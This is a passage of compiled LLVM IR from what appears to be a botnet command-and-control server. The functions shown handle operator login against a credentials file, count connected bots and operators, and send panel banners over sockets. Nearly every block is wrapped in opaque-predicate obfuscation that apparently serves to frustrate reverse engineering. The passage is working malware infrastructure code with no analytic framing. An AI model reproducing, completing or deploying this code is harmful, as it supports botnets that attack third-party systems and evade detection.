  %22 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i32 0, i32 0
  %23 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i32 0, i32 0
  %24 = call i64 @strlen(i8* %23) #8
  %25 = call i64 @send(i32 %21, i8* %22, i64 %24, i32 16384)
  %26 = icmp eq i64 %25, -1
  %27 = load i32, i32* @x.11
  %28 = load i32, i32* @y.12
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %26, label %35, label %36

; <label>:35:                                     ; preds = %originalBBpart2
  ret i8* null

; <label>:36:                                     ; preds = %originalBBpart2
  %37 = call i32 @sleep(i32 2)
  br label %7

originalBBalteredBB:                              ; preds = %originalBB, %7
  %38 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %38, i8 0, i64 2048, i32 16, i1 false)
  %39 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i32 0, i32 0
  %40 = call i32 @BotsConnected()
  %41 = load volatile i32, i32* @OperatorsConnected, align 4
  %42 = call i32 (i8*, i8*, ...) @sprintf(i8* %39, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.17, i32 0, i32 0), i32 27, i32 %40, i32 %41, i32 7) #7
  %43 = load i32, i32* %3, align 4
  %44 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i32 0, i32 0
  %45 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i32 0, i32 0
  %46 = call i64 @strlen(i8* %45) #8
  %47 = call i64 @send(i32 %43, i8* %44, i64 %46, i32 16384)
  %48 = icmp eq i64 %47, -1
  br label %originalBB
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

declare i32 @sleep(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @Find_Login(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [512 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %9 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i32 0, i32 0))
  store %struct._IO_FILE* %9, %struct._IO_FILE** %4, align 8
  %10 = icmp eq %struct._IO_FILE* %9, null
  br i1 %10, label %11, label %12

; <label>:11:                                     ; preds = %1
  store i32 -1, i32* %2, align 4
  br label %74

; <label>:12:                                     ; preds = %1
  br label %13

; <label>:13:                                     ; preds = %43, %12
  %14 = load i32, i32* @x.13
  %15 = load i32, i32* @y.14
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %13
  %22 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i32 0, i32 0
  %23 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %24 = call i8* @fgets(i8* %22, i32 512, %struct._IO_FILE* %23)
  %25 = icmp ne i8* %24, null
  %26 = load i32, i32* @x.13
  %27 = load i32, i32* @y.14
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %25, label %34, label %46

; <label>:34:                                     ; preds = %originalBBpart2
  %35 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i32 0, i32 0
  %36 = load i8*, i8** %3, align 8
  %37 = call i8* @strstr(i8* %35, i8* %36) #8
  %38 = icmp ne i8* %37, null
  br i1 %38, label %39, label %43

; <label>:39:                                     ; preds = %34
  %40 = load i32, i32* %6, align 4
  %41 = add nsw i32 %40, 1
  store i32 %41, i32* %6, align 4
  %42 = load i32, i32* %5, align 4
  store i32 %42, i32* %7, align 4
  br label %43

; <label>:43:                                     ; preds = %39, %34
  %44 = load i32, i32* %5, align 4
  %45 = add nsw i32 %44, 1
  store i32 %45, i32* %5, align 4
  br label %13

; <label>:46:                                     ; preds = %originalBBpart2
  %47 = load i32, i32* @x.13
  %48 = load i32, i32* @y.14
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %46
  %55 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %56 = icmp ne %struct._IO_FILE* %55, null
  %57 = load i32, i32* @x.13
  %58 = load i32, i32* @y.14
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %56, label %65, label %68

; <label>:65:                                     ; preds = %originalBBpart24
  %66 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %67 = call i32 @fclose(%struct._IO_FILE* %66)
  br label %68

; <label>:68:                                     ; preds = %65, %originalBBpart24
  %69 = load i32, i32* %6, align 4
  %70 = icmp eq i32 %69, 0
  br i1 %70, label %71, label %72

; <label>:71:                                     ; preds = %68
  store i32 0, i32* %2, align 4
  br label %74

; <label>:72:                                     ; preds = %68
  %73 = load i32, i32* %7, align 4
  store i32 %73, i32* %2, align 4
  br label %74

; <label>:74:                                     ; preds = %72, %71, %11
  %75 = load i32, i32* @x.13
  %76 = load i32, i32* @y.14
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %74
  %83 = load i32, i32* %2, align 4
  %84 = load i32, i32* @x.13
  %85 = load i32, i32* @y.14
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  ret i32 %83

originalBBalteredBB:                              ; preds = %originalBB, %13
  %92 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i32 0, i32 0
  %93 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %94 = call i8* @fgets(i8* %92, i32 512, %struct._IO_FILE* %93)
  %95 = icmp ne i8* %94, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %46
  %96 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %97 = icmp ne %struct._IO_FILE* %96, null
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %74
  %98 = load i32, i32* %2, align 4
  br label %originalBB6
}

declare %struct._IO_FILE* @fopen(i8*, i8*) #1

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #1

declare i32 @fclose(%struct._IO_FILE*) #1

; Function Attrs: noinline nounwind uwtable
define i8* @BotWorker(i8*) #0 {
  %2 = load i32, i32* @x.15
  %3 = load i32, i32* @y.16
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i64, align 8
  %15 = alloca [2048 x i8], align 16
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca [2048 x i8], align 16
  %19 = alloca %struct._IO_FILE*, align 8
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca [80 x i8], align 16
  %25 = alloca [5000 x i8], align 16
  %26 = alloca [5000 x i8], align 16
  %27 = alloca [5000 x i8], align 16
  %28 = alloca [5000 x i8], align 16
  %29 = alloca [5000 x i8], align 16
  %30 = alloca [5000 x i8], align 16
  %31 = alloca [5000 x i8], align 16
  %32 = alloca [5000 x i8], align 16
  %33 = alloca [5000 x i8], align 16
  %34 = alloca [80 x i8], align 16
  %35 = alloca [2048 x i8], align 16
  %36 = alloca [2048 x i8], align 16
  %37 = alloca [2048 x i8], align 16
  %38 = alloca [80 x i8], align 16
  %39 = alloca [80 x i8], align 16
  %40 = alloca [80 x i8], align 16
  %41 = alloca [80 x i8], align 16
  %42 = alloca [80 x i8], align 16
  %43 = alloca [80 x i8], align 16
  %44 = alloca [80 x i8], align 16
  %45 = alloca [80 x i8], align 16
  %46 = alloca [80 x i8], align 16
  %47 = alloca [80 x i8], align 16
  %48 = alloca [80 x i8], align 16
  %49 = alloca [80 x i8], align 16
  %50 = alloca [80 x i8], align 16
  %51 = alloca [80 x i8], align 16
  %52 = alloca [80 x i8], align 16
  %53 = alloca [80 x i8], align 16
  %54 = alloca [80 x i8], align 16
  %55 = alloca [80 x i8], align 16
  %56 = alloca [80 x i8], align 16
  %57 = alloca [80 x i8], align 16
  %58 = alloca [80 x i8], align 16
  %59 = alloca [80 x i8], align 16
  %60 = alloca [2048 x i8], align 16
  %61 = alloca [2048 x i8], align 16
  %62 = alloca [80 x i8], align 16
  %63 = alloca [80 x i8], align 16
  %64 = alloca [2048 x i8], align 16
  %65 = alloca %struct._IO_FILE*, align 8
  %66 = alloca i64, align 8
  %67 = alloca %struct.tm*, align 8
  %68 = alloca [50 x i8], align 16
  %69 = alloca [50 x i8], align 16
  store i8* %0, i8** %11, align 8
  %70 = load i8*, i8** %11, align 8
  %71 = ptrtoint i8* %70 to i32
  store i32 %71, i32* %12, align 4
  %72 = load volatile i32, i32* @OperatorsConnected, align 4
  %73 = add nsw i32 %72, 1
  store volatile i32 %73, i32* @OperatorsConnected, align 4
  %74 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %74, i8 0, i64 2048, i32 16, i1 false)
  %75 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %75, i8 0, i64 2048, i32 16, i1 false)
  store i32 0, i32* %20, align 4
  %76 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i32 0, i32 0))
  store %struct._IO_FILE* %76, %struct._IO_FILE** %19, align 8
  %77 = load i32, i32* @x.15
  %78 = load i32, i32* @y.16
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %85

; <label>:85:                                     ; preds = %90, %originalBBpart2
  %86 = load %struct._IO_FILE*, %struct._IO_FILE** %19, align 8
  %87 = call i32 @feof(%struct._IO_FILE* %86) #7
  %88 = icmp ne i32 %87, 0
  %89 = xor i1 %88, true
  br i1 %89, label %90, label %95

; <label>:90:                                     ; preds = %85
  %91 = load %struct._IO_FILE*, %struct._IO_FILE** %19, align 8
  %92 = call i32 @fgetc(%struct._IO_FILE* %91)
  store i32 %92, i32* %21, align 4
  %93 = load i32, i32* %20, align 4
  %94 = add nsw i32 %93, 1
  store i32 %94, i32* %20, align 4
  br label %85

; <label>:95:                                     ; preds = %85
  store i32 0, i32* %22, align 4
  %96 = load %struct._IO_FILE*, %struct._IO_FILE** %19, align 8
  call void @rewind(%struct._IO_FILE* %96)
  br label %97

; <label>:97:                                     ; preds = %originalBBpart27, %95
  %98 = load i32, i32* %22, align 4
  %99 = load i32, i32* %20, align 4
  %100 = sub nsw i32 %99, 1
  %101 = icmp ne i32 %98, %100
  br i1 %101, label %102, label %133

; <label>:102:                                    ; preds = %97
  %103 = load i32, i32* @x.15
  %104 = load i32, i32* @y.16
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %102
  %111 = load %struct._IO_FILE*, %struct._IO_FILE** %19, align 8
  %112 = load i32, i32* %22, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %113
  %115 = getelementptr inbounds %struct.login_info, %struct.login_info* %114, i32 0, i32 0
  %116 = getelementptr inbounds [20 x i8], [20 x i8]* %115, i32 0, i32 0
  %117 = load i32, i32* %22, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %118
  %120 = getelementptr inbounds %struct.login_info, %struct.login_info* %119, i32 0, i32 1
  %121 = getelementptr inbounds [20 x i8], [20 x i8]* %120, i32 0, i32 0
  %122 = call i32 (%struct._IO_FILE*, i8*, ...) @__isoc99_fscanf(%struct._IO_FILE* %111, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.20, i32 0, i32 0), i8* %116, i8* %121)
  %123 = load i32, i32* %22, align 4
  %124 = add nsw i32 %123, 1
  store i32 %124, i32* %22, align 4
  %125 = load i32, i32* @x.15
  %126 = load i32, i32* @y.16
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBBpart27, label %originalBB1alteredBB

originalBBpart27:                                 ; preds = %originalBB1
  br label %97

; <label>:133:                                    ; preds = %97
  %134 = load i32, i32* @x.15
  %135 = load i32, i32* @y.16
  %136 = sub i32 %134, 1
  %137 = mul i32 %134, %136
  %138 = urem i32 %137, 2
  %139 = icmp eq i32 %138, 0
  %140 = icmp slt i32 %135, 10
  %141 = or i1 %139, %140
  br i1 %141, label %originalBB9, label %originalBB9alteredBB

originalBB9:                                      ; preds = %originalBB9alteredBB, %133
  %142 = load i32, i32* %12, align 4
  %143 = call i64 @send(i32 %142, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.21, i32 0, i32 0), i64 22, i32 16384)
  %144 = icmp eq i64 %143, -1
  %145 = load i32, i32* @x.15
  %146 = load i32, i32* @y.16
  %147 = sub i32 %145, 1
  %148 = mul i32 %145, %147
  %149 = urem i32 %148, 2
  %150 = icmp eq i32 %149, 0
  %151 = icmp slt i32 %146, 10
  %152 = or i1 %150, %151
  br i1 %152, label %originalBBpart211, label %originalBB9alteredBB

originalBBpart211:                                ; preds = %originalBB9
  br i1 %144, label %153, label %170

; <label>:153:                                    ; preds = %originalBBpart211
  %154 = load i32, i32* @x.15
  %155 = load i32, i32* @y.16
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBB13, label %originalBB13alteredBB

originalBB13:                                     ; preds = %originalBB13alteredBB, %153
  %162 = load i32, i32* @x.15
  %163 = load i32, i32* @y.16
  %164 = sub i32 %162, 1
  %165 = mul i32 %162, %164
  %166 = urem i32 %165, 2
  %167 = icmp eq i32 %166, 0
  %168 = icmp slt i32 %163, 10
  %169 = or i1 %167, %168
  br i1 %169, label %originalBBpart215, label %originalBB13alteredBB

originalBBpart215:                                ; preds = %originalBB13
  br label %1831

; <label>:170:                                    ; preds = %originalBBpart211
  %171 = load i32, i32* @x.15
  %172 = load i32, i32* @y.16
  %173 = sub i32 %171, 1
  %174 = mul i32 %171, %173
  %175 = urem i32 %174, 2
  %176 = icmp eq i32 %175, 0
  %177 = icmp slt i32 %172, 10
  %178 = or i1 %176, %177
  br i1 %178, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %170
  %179 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i32 0, i32 0
  %180 = load i32, i32* %12, align 4
  %181 = call i32 @fdgets(i8* %179, i32 2048, i32 %180)
  %182 = icmp slt i32 %181, 1
  %183 = load i32, i32* @x.15
  %184 = load i32, i32* @y.16
  %185 = sub i32 %183, 1
  %186 = mul i32 %183, %185
  %187 = urem i32 %186, 2
  %188 = icmp eq i32 %187, 0
  %189 = icmp slt i32 %184, 10
  %190 = or i1 %188, %189
  br i1 %190, label %originalBBpart219, label %originalBB17alteredBB

originalBBpart219:                                ; preds = %originalBB17
  br i1 %182, label %191, label %192

; <label>:191:                                    ; preds = %originalBBpart219
  br label %1831

; <label>:192:                                    ; preds = %originalBBpart219
  %193 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i32 0, i32 0
  call void @trim(i8* %193)
  %194 = load i32, i32* %13, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %195
  %197 = getelementptr inbounds %struct.login_info, %struct.login_info* %196, i32 0, i32 0
  %198 = getelementptr inbounds [20 x i8], [20 x i8]* %197, i32 0, i32 0
  %199 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i32 0, i32 0
  %200 = call i32 (i8*, i8*, ...) @sprintf(i8* %198, i8* %199) #7
  %201 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i32 0, i32 0
  store i8* %201, i8** %23, align 8
  %202 = load i8*, i8** %23, align 8
  %203 = call i32 @Find_Login(i8* %202)
  store i32 %203, i32* %13, align 4
  %204 = load i8*, i8** %23, align 8
  %205 = load i32, i32* %13, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %206
  %208 = getelementptr inbounds %struct.login_info, %struct.login_info* %207, i32 0, i32 0
  %209 = getelementptr inbounds [20 x i8], [20 x i8]* %208, i32 0, i32 0
  %210 = call i32 @strcmp(i8* %204, i8* %209) #8
  %211 = icmp eq i32 %210, 0
  br i1 %211, label %212, label %300

; <label>:212:                                    ; preds = %192
  %213 = load i32, i32* %12, align 4
  %214 = call i64 @send(i32 %213, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.23, i32 0, i32 0), i64 22, i32 16384)
  %215 = icmp eq i64 %214, -1
  br i1 %215, label %216, label %233

; <label>:216:                                    ; preds = %212
  %217 = load i32, i32* @x.15
  %218 = load i32, i32* @y.16
  %219 = sub i32 %217, 1
  %220 = mul i32 %217, %219
  %221 = urem i32 %220, 2
  %222 = icmp eq i32 %221, 0
  %223 = icmp slt i32 %218, 10
  %224 = or i1 %222, %223
  br i1 %224, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %216
  %225 = load i32, i32* @x.15
  %226 = load i32, i32* @y.16
  %227 = sub i32 %225, 1
  %228 = mul i32 %225, %227
  %229 = urem i32 %228, 2
  %230 = icmp eq i32 %229, 0
  %231 = icmp slt i32 %226, 10
  %232 = or i1 %230, %231
  br i1 %232, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  br label %1831

; <label>:233:                                    ; preds = %212
  %234 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i32 0, i32 0
  %235 = load i32, i32* %12, align 4
  %236 = call i32 @fdgets(i8* %234, i32 2048, i32 %235)
  %237 = icmp slt i32 %236, 1
  br i1 %237, label %238, label %255

; <label>:238:                                    ; preds = %233
  %239 = load i32, i32* @x.15
  %240 = load i32, i32* @y.16
  %241 = sub i32 %239, 1
  %242 = mul i32 %239, %241
  %243 = urem i32 %242, 2
  %244 = icmp eq i32 %243, 0
  %245 = icmp slt i32 %240, 10
  %246 = or i1 %244, %245
  br i1 %246, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %238
  %247 = load i32, i32* @x.15
  %248 = load i32, i32* @y.16
  %249 = sub i32 %247, 1
  %250 = mul i32 %247, %249
  %251 = urem i32 %250, 2
  %252 = icmp eq i32 %251, 0
  %253 = icmp slt i32 %248, 10
  %254 = or i1 %252, %253
  br i1 %254, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  br label %1831

; <label>:255:                                    ; preds = %233
  %256 = load i32, i32* @x.15
  %257 = load i32, i32* @y.16
  %258 = sub i32 %256, 1
  %259 = mul i32 %256, %258
  %260 = urem i32 %259, 2
  %261 = icmp eq i32 %260, 0
  %262 = icmp slt i32 %257, 10
  %263 = or i1 %261, %262
  br i1 %263, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %255
  %264 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i32 0, i32 0
  call void @trim(i8* %264)
  %265 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i32 0, i32 0
  %266 = load i32, i32* %13, align 4
  %267 = sext i32 %266 to i64
  %268 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %267
  %269 = getelementptr inbounds %struct.login_info, %struct.login_info* %268, i32 0, i32 1
  %270 = getelementptr inbounds [20 x i8], [20 x i8]* %269, i32 0, i32 0
  %271 = call i32 @strcmp(i8* %265, i8* %270) #8
  %272 = icmp ne i32 %271, 0
  %273 = load i32, i32* @x.15
  %274 = load i32, i32* @y.16
  %275 = sub i32 %273, 1
  %276 = mul i32 %273, %275
  %277 = urem i32 %276, 2
  %278 = icmp eq i32 %277, 0
  %279 = icmp slt i32 %274, 10
  %280 = or i1 %278, %279
  br i1 %280, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br i1 %272, label %281, label %282

; <label>:281:                                    ; preds = %originalBBpart231
  br label %301

; <label>:282:                                    ; preds = %originalBBpart231
  %283 = load i32, i32* @x.15
  %284 = load i32, i32* @y.16
  %285 = sub i32 %283, 1
  %286 = mul i32 %283, %285
  %287 = urem i32 %286, 2
  %288 = icmp eq i32 %287, 0
  %289 = icmp slt i32 %284, 10
  %290 = or i1 %288, %289
  br i1 %290, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %282
  %291 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %291, i8 0, i64 2048, i32 16, i1 false)
  %292 = load i32, i32* @x.15
  %293 = load i32, i32* @y.16
  %294 = sub i32 %292, 1
  %295 = mul i32 %292, %294
  %296 = urem i32 %295, 2
  %297 = icmp eq i32 %296, 0
  %298 = icmp slt i32 %293, 10
  %299 = or i1 %297, %298
  br i1 %299, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br label %334

; <label>:300:                                    ; preds = %192
  br label %301

; <label>:301:                                    ; preds = %300, %281
  %302 = load i32, i32* %12, align 4
  %303 = call i64 @send(i32 %302, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.24, i32 0, i32 0), i64 5, i32 16384)
  %304 = icmp eq i64 %303, -1
  br i1 %304, label %305, label %322

; <label>:305:                                    ; preds = %301
  %306 = load i32, i32* @x.15
  %307 = load i32, i32* @y.16
  %308 = sub i32 %306, 1
  %309 = mul i32 %306, %308
  %310 = urem i32 %309, 2
  %311 = icmp eq i32 %310, 0
  %312 = icmp slt i32 %307, 10
  %313 = or i1 %311, %312
  br i1 %313, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %305
  %314 = load i32, i32* @x.15
  %315 = load i32, i32* @y.16
  %316 = sub i32 %314, 1
  %317 = mul i32 %314, %316
  %318 = urem i32 %317, 2
  %319 = icmp eq i32 %318, 0
  %320 = icmp slt i32 %315, 10
  %321 = or i1 %319, %320
  br i1 %321, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br label %1831

; <label>:322:                                    ; preds = %301
  %323 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %324 = call i32 (i8*, i8*, ...) @sprintf(i8* %323, i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.25, i32 0, i32 0)) #7
  %325 = load i32, i32* %12, align 4
  %326 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %327 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %328 = call i64 @strlen(i8* %327) #8
  %329 = call i64 @send(i32 %325, i8* %326, i64 %328, i32 16384)
  %330 = icmp eq i64 %329, -1
  br i1 %330, label %331, label %332

; <label>:331:                                    ; preds = %322
  br label %1831

; <label>:332:                                    ; preds = %322
  %333 = call i32 @sleep(i32 5)
  br label %1831

; <label>:334:                                    ; preds = %originalBBpart235
  %335 = load i32, i32* @x.15
  %336 = load i32, i32* @y.16
  %337 = sub i32 %335, 1
  %338 = mul i32 %335, %337
  %339 = urem i32 %338, 2
  %340 = icmp eq i32 %339, 0
  %341 = icmp slt i32 %336, 10
  %342 = or i1 %340, %341
  br i1 %342, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %334
  %343 = load i8*, i8** %11, align 8
  %344 = call i32 @pthread_create(i64* %14, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %343) #7
  %345 = getelementptr inbounds [2048 x i8], [2048 x i8]* %35, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %345, i8 0, i64 2048, i32 16, i1 false)
  %346 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %347 = call i32 (i8*, i8*, ...) @sprintf(i8* %346, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.26, i32 0, i32 0)) #7
  %348 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i32 0, i32 0
  %349 = call i32 (i8*, i8*, ...) @sprintf(i8* %348, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.27, i32 0, i32 0)) #7
  %350 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i32 0, i32 0
  %351 = call i32 (i8*, i8*, ...) @sprintf(i8* %350, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.28, i32 0, i32 0)) #7
  %352 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i32 0, i32 0
  %353 = call i32 (i8*, i8*, ...) @sprintf(i8* %352, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.29, i32 0, i32 0)) #7
  %354 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i32 0, i32 0
  %355 = call i32 (i8*, i8*, ...) @sprintf(i8* %354, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.30, i32 0, i32 0)) #7
  %356 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i32 0, i32 0
  %357 = call i32 (i8*, i8*, ...) @sprintf(i8* %356, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.31, i32 0, i32 0)) #7
  %358 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i32 0, i32 0
  %359 = call i32 (i8*, i8*, ...) @sprintf(i8* %358, i8* getelementptr inbounds ([158 x i8], [158 x i8]* @.str.32, i32 0, i32 0)) #7
  %360 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i32 0, i32 0
  %361 = call i32 (i8*, i8*, ...) @sprintf(i8* %360, i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.33, i32 0, i32 0)) #7
  %362 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i32 0, i32 0
  %363 = call i32 (i8*, i8*, ...) @sprintf(i8* %362, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.34, i32 0, i32 0)) #7
  %364 = getelementptr inbounds [80 x i8], [80 x i8]* %34, i32 0, i32 0
  %365 = load i32, i32* %13, align 4
  %366 = sext i32 %365 to i64
  %367 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %366
  %368 = getelementptr inbounds %struct.login_info, %struct.login_info* %367, i32 0, i32 0
  %369 = getelementptr inbounds [20 x i8], [20 x i8]* %368, i32 0, i32 0
  %370 = call i32 (i8*, i8*, ...) @sprintf(i8* %364, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.35, i32 0, i32 0), i8* %369) #7
  %371 = getelementptr inbounds [2048 x i8], [2048 x i8]* %35, i32 0, i32 0
